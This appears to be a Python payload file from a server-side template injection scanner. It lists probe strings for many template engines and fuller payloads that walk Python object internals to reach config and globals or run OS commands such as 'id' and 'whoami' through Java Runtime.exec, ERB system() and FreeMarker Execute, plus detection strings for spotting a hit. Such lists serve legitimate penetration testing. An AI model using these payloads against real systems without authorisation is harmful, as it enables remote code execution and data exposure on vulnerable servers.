
QUICK_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{7*7}",
    "{{7*'7'}}",
    "${{7*7}}",
    "{{config}}",
    "{{self}}",
    "<%=7*7%>",
]

FULL_PAYLOADS = [
    "{{7*7*7}}",
    "${7*7*7}",
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{config.items()}}",
    "{{request.application.__self__._get_data_for_json.__globals__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "<%= system('id') %>",
    "{{range.constructor(\"return this\")()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "*{T(java.lang.Runtime).getRuntime().exec('whoami')}",
    "@(1+2)",
    "{{constructor.constructor('return this')()}}",
    "{{4*4}}[[5*5]]",
    "{{= 7*7}}",
    "${{7*7}}",
    "#{7*7*7}",
    "<%= 7*7*7 %>",
]

DETECTION_PATTERNS = [
    "49",
    "343",
    "7777777",
    "class 'str'",
    "config",
    "self",
    "__class__",
    "__mro__",
    "subclasses",
]
